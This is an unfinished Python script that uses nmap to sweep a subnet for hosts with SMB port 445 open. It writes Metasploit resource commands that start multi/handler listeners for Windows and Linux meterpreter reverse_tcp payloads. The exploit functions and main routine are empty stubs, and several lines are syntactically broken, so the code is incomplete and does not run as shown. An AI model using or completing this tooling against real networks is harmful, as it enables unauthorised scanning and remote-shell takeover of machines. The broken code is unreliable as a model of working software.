import nmap
import netaddr
import sys
import os
import optparse

def findTgts(subnets,target_port):
    subnets=netaddr.IPNetwork(subnets)
    target_host_list=[]
    nmScan=nmap.PortScanner()
    for subnet in subnets:
        nmScan.scan(subnet,target_port)
        try:
            state=nmScan[subnet]['tcp'][445]['state']
            if state == 'open':
                target_host_list.append(subnet)
        except:
            continue
    return target_host_list

def steup_win_Handler(configFile,lhost,lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('set LPORT '+lport+'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def setup_linux_Handler(configFile,lhost,lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD linux/x86/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def attack_module_1()

def attack_module_2():


def main():
    optparse.

if __name__ == '__main__':

